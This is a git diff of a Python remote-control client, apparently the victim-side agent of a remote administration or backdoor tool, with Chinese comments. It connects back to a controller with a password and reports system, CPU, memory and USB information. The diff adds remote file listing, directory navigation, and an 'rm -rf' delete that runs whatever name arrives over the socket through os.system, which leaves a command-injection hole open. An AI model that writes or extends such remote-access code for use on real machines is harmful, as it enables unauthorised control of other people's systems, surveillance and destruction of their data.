@@ -6,12 +6,14 @@ import socket
 import time
 import os
 
-# 变量定义 ACTIVE 是否主动连接控制端 / SYS 被控端系统类型自动填写不用管
+# 变量定义 ACTIVE 是否主动连接控制端 / TEMP 临时文件路径 / SYS 被控端系统类型 / PATH 被控端文件管理当前路径
 ACTIVE = 1
 IP = '127.0.0.1'
 PORT = 9481
 PASS = 'AC131'
+TEMP = None
 SYS =  None
+PATH = None
 
 #文字颜色
 # 红色 \033[0;31;48m[!]\033[0m
@@ -71,28 +73,28 @@ def Getinfo(sock):
         os.system('del /f /q C:\\ProgramData\\info.txt')
         return
     else:
-        os.system('echo posix@ > info.txt')
-        os.system('uname -a >> info.txt')
-        f = open('info.txt','r')
+        os.system('echo posix@ > %s/info.txt' % TEMP)
+        os.system('uname -a >> %s/info.txt' % TEMP)
+        f = open('%s/info.txt' % TEMP,'r')
         data = f.read()
         f.close()
         Send(data,sock)
-        os.system('rm -f info.txt')
+        os.system('rm -f %s/info.txt' % TEMP)
         return
 
 # 获取更多信息
 def GetMoreinfo(sock,target):
     if target == 'CPU':
-        os.system('cat /proc/cpuinfo >> info.txt')
+        os.system('cat /proc/cpuinfo >> %s/info.txt' % TEMP)
     elif target == 'MEM':
-        os.system('cat /proc/meminfo >> info.txt')
+        os.system('cat /proc/meminfo >> %s/info.txt' % TEMP)
     elif target == 'USB':
-        os.system('lsusb -tv >> info.txt')
-    f = open('info.txt','r')
+        os.system('lsusb -tv >> %s/info.txt' % TEMP)
+    f = open('%s/info.txt' % TEMP,'r')
     data = f.read()
     f.close()
     Send(data,sock)
-    os.system('rm -f info.txt')
+    os.system('rm -f %s/info.txt' % TEMP)
 
 # 进程信息
 def Process(sock):
@@ -134,6 +136,57 @@ def KillId(sock):
         os.system('kill -9 %s' %id)
     sock.send(b'The command has been executed.')
     return
+    
+# 文件列表
+def File(sock):
+    global PATH
+    if SYS == 'nt':
+        os.system('echo %s@V@ >> C:\\ProgramData\\info.txt' % PATH)
+        os.system('dir %s >> C:\\ProgramData\\info.txt' % PATH)
+        f = open('C:\\ProgramData\\info.txt','r')
+        data = f.read()
+        f.close()
+        Send(data,sock)
+        os.system('del /f /q C:\\ProgramData\\info.txt')
+        return
+    else:
+        os.system('echo %s@V@ >> %s/info.txt' % (PATH, TEMP))
+        os.system('ls -l %s >> %s/info.txt' % (PATH, TEMP))
+        f = open('%s/info.txt' % TEMP,'r')
+        data = f.read()
+        f.close()
+        Send(data,sock)
+        os.system('rm -f %s/info.txt' % TEMP)
+        return
+
+# 父目录
+def UpDic(sock):
+    global PATH
+    try:
+        os.chdir('..')
+    except:
+        pass
+    PATH = os.getcwd()
+    return
+
+# 子目录
+def DownDic(sock):
+    global PATH
+    d = sock.recv(1024)
+    name = d.decode('utf-8')
+    try:
+        os.chdir('%s' % name)
+    except:
+        pass
+    PATH = os.getcwd()
+    return
+
+# 删除文件
+def Del(sock):
+    d = sock.recv(1024)
+    name = d.decode('utf-8')
+    os.system('rm -rf %s' % name)
+    return
 
 # 主程序
 if ACTIVE == 0:
@@ -142,9 +195,13 @@ else:
     s = Active()
 #系统判断的核心，只能判断win/linux，并且判断不出MacOS，后面命令都是按Linux写的，所以不支持Macos
 SYS = os.name
+#获取当前工作路径
+PATH = os.getcwd()
+TEMP = os.getcwd()
 #循环接受命令，一级指令为数字，二级为*（一级）x*（二级）
 while True:
     d = s.recv(1024)
+    print('%s' % d)
     if d == b'0':
         s.send(b'Bye')
         break
@@ -163,5 +220,11 @@ while True:
     elif d == b'2x02':
         KillId(s)
     elif d == b'3':
-        break
+        File(s)
+    elif d == b'3x01':
+        UpDic(s)
+    elif d == b'3x02':
+        DownDic(s)
+    elif d == b'3x03':
+        Del(s)
 s.close()
